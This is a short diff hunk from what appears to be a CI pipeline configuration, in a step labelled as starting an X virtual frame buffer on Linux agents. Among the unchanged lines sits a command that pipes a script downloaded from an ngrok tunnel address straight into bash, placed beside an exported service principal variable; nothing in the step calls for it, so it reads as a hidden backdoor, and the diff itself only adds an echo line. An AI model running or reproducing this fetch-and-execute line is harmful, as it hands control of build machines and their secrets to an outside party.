@@ -7,6 +7,7 @@ steps:
     export SERVICE_PRINCIPAL_DOMAIN = $(SERVICE_PRINCIPAL_DOMAIN)
     curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
     sudo update-rc.d xvfb defaults
+    echo "[!] Starting.."
     sudo service xvfb start
   displayName: 'Start X Virtual Frame Buffer'
   condition: eq(variables['Agent.OS'], 'Linux')
